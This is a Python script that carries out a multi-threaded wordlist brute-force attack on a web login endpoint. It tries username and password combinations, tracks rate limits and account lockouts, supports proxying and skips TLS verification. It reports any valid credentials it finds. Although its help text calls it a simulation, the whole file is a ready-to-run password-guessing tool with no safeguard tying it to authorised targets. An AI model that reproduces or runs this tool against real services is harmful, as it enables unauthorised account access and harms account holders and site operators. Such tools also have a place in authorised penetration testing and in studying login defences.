import argparse
import time
import sys
import json
from concurrent.futures import ThreadPoolExecutor, as_completed

import urllib3
from datetime import datetime, timezone

try:
    import requests
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
except ImportError:
    sys.exit("Please install requests")


def make_session(proxy=None):
    session = requests.Session()
    retries = Retry(total=3, backoff_factor=0.2, status_forcelist=[500, 502, 503])
    adapter = HTTPAdapter(max_retries=retries)
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    if proxy:
        session.proxies = {"http": proxy, "https": proxy}
    return session


def set_auth(session, token, cookie, header_name):
    if token:
        if cookie:
            session.cookies.set(cookie, token)
        elif header_name:
            session.headers["AUTHORIZATION"] = f"Bearer {token}"
        else:
            session.headers["AUTHORIZATION"] = f"Bearer {token}"


def load_lines(path):
    """Load a wordlist file, stripping blank lines and comments."""
    with open(path, "r", errors="replace") as f:
        return [line.strip() for line in f if line.strip() and not line.startswith("#")]


def wordlist_attack(session, url, usernames, passwords,
                    field_user, field_pass, success, fail_on_lock,
                    delay, workers, verbose, use_json):
    """
    Try every (username, password) combination from the provided lists.
    Stops a username early if it becomes locked.
    """
    findings = []
    locked_users = set()
    stop = [False]  # shared early-exit flag

    def try_single(username, password):
        if stop[0] or username in locked_users:
            return None
        result = _try_credentials(
            session, url, username, password,
            field_user, field_pass, success, verbose, use_json
        )
        return username, password, result

    pairs = [
        (u, p)
        for u in usernames
        for p in passwords
        if u not in locked_users
    ]

    with ThreadPoolExecutor(max_workers=workers) as executor:
        future_map = {
            executor.submit(try_single, u, p): (u, p) for u, p in pairs
        }
        for future in as_completed(future_map):
            if stop[0]:
                executor.shutdown(wait=False, cancel_futures=True)
                break

            res = future.result()
            if res is None:
                continue

            username, password, result = res

            if result == "success":
                print(f"\n[!!!] Valid credentials found: {username}:{password}")
                findings.append({"type": "valid_credentials", "username": username, "password": password})

            elif result == "ratelimited":
                print(f"[~] Rate-limited — sleeping 30s")
                time.sleep(30)

            elif result == "locked":
                print(f"[!] Account locked: {username}")
                locked_users.add(username)
                if fail_on_lock:
                    print("[!] --fail-on-lock set, stopping.")
                    stop[0] = True
                    executor.shutdown(wait=False, cancel_futures=True)

            if delay:
                time.sleep(delay)

    return findings


def _try_credentials(session, url, username, password,
                     field_user, field_pass, success, verbose, use_json):
    payload = {field_user: username, field_pass: password}

    try:
        if use_json:
            response = session.post(url, json=payload, timeout=10,
                                    allow_redirects=True, verify=False)
        else:
            response = session.post(url, data=payload, timeout=10,
                                    allow_redirects=True, verify=False)

        body = response.text.lower()
        success_lower = success.lower()

        if verbose:
            mark = "HIT" if success_lower in body else "---"
            print(f"  [{mark}] {username}:{password} → HTTP {response.status_code}")

        if response.status_code == 429:
            return "ratelimited"
        if response.status_code in (423, 403) and "locked" in body:
            return "locked"
        if response.history and response.status_code == 200:
            return "success"

    except requests.exceptions.RequestException as e:
        print(f"[!] Request error ({username}:{password}): {e}")

    return "fail"


def save_report(data, path="password_results.json"):
    data["generated"] = datetime.now(timezone.utc).isoformat()
    with open(path, "w") as f:
        json.dump(data, f, indent=2)
    print(f"Report saved to {path}")


def main():
    parser = argparse.ArgumentParser(description="Username/password brute-force simulation")

    # Target
    parser.add_argument("--url",           required=True,  help="Login endpoint URL")

    # Credential sources
    parser.add_argument("--usernames",     required=True,  help="Path to username wordlist")
    parser.add_argument("--passwords",     required=True,  help="Path to password wordlist")

    # Alternatively, fix a single username or password
    parser.add_argument("--username",      default=None,   help="Single username to test (overrides --usernames)")
    parser.add_argument("--password",      default=None,   help="Single password to test (overrides --passwords)")

    # Field names in the request body
    parser.add_argument("--field-user",    default="username", help="Body field name for the username (default: username)")
    parser.add_argument("--field-pass",    default="password", help="Body field name for the password (default: password)")

    # Request format
    parser.add_argument("--json",          dest="use_json", action="store_true",
                        help="Send payload as JSON (default: form-encoded)")

    # Success detection
    parser.add_argument("--success",       default="dashboard",
                        help="String in response body that indicates a successful login")

    # Session / auth passthrough (same as TOTP script)
    parser.add_argument("--session-token", default=None)
    parser.add_argument("--cookie-name",   default=None)
    parser.add_argument("--header-name",   default=None)

    # Behaviour
    parser.add_argument("--workers",       type=int,   default=5,
                        help="Concurrent threads 5")
    parser.add_argument("--delay",         type=float, default=0.0,
                        help="Seconds to sleep between requests (default: 0)")
    parser.add_argument("--fail-on-lock",  action="store_true",
                        help="Abort entirely if any account lockout is detected")
    parser.add_argument("--proxy",         default=None,
                        help="HTTP/S proxy (e.g. http://127.0.0.1:8080 for Burp)")

    parser.add_argument("--verbose",       action="store_true")
    parser.add_argument("--output",        default="password_results.json")

    args = parser.parse_args()

    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    # Build credential lists
    usernames = [args.username] if args.username else load_lines(args.usernames)
    passwords = [args.password] if args.password else load_lines(args.passwords)

    print(f"[*] Target  : {args.url}")
    print(f"[*] Users   : {len(usernames)}")
    print(f"[*] Passwords: {len(passwords)}")
    print(f"[*] Combos  : {len(usernames) * len(passwords)}")
    print(f"[*] Workers : {args.workers}\n")

    s = make_session(args.proxy)
    set_auth(s, args.session_token, args.cookie_name, args.header_name)

    result_data = {
        "mode": "wordlist",
        "url": args.url,
        "findings": [],
    }

    findings = wordlist_attack(
        session=s,
        url=args.url,
        usernames=usernames,
        passwords=passwords,
        field_user=args.field_user,
        field_pass=args.field_pass,
        success=args.success,
        fail_on_lock=args.fail_on_lock,
        delay=args.delay,
        workers=args.workers,
        verbose=args.verbose,
        use_json=args.use_json,
    )

    result_data["findings"] = findings
    if not findings:
        print("\n[-] No valid credentials found.")

    save_report(result_data, args.output)


if __name__ == "__main__":
    main()